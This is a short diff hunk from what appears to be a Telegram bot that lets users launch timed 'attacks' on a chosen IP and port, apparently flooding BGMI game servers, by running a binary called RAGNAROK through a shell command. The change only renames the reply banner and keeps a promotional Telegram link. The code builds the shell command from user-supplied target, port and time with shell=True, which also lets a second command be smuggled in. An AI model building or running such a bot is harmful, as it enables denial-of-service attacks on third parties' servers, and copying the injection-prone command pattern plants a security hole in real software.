@@ -247,7 +247,7 @@ def handle_bgmi(message):
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./RAGNAROK {target} {port} {time}"
                 subprocess.run(full_command, shell=True)
-                response = f"RAGNAROK 🚀\nAttack1 Finished. \n📡 Target: {target} \n🔌 Port: {port} \n⏱️ Time: {time} \n BY https://t.me/+iEJcE-Il6aUwNzk1"
+                response = f"RAJPUT 🚀\nAttack1 Finished. \n📡 Target: {target} \n🔌 Port: {port} \n⏱️ Time: {time} \n BY https://t.me/+iEJcE-Il6aUwNzk1"
         else:
             response = "Usage :- /rajput <target> <port> <time>\nBy https://t.me/+iEJcE-Il6aUwNzk1"  # Updated command syntax
     else:
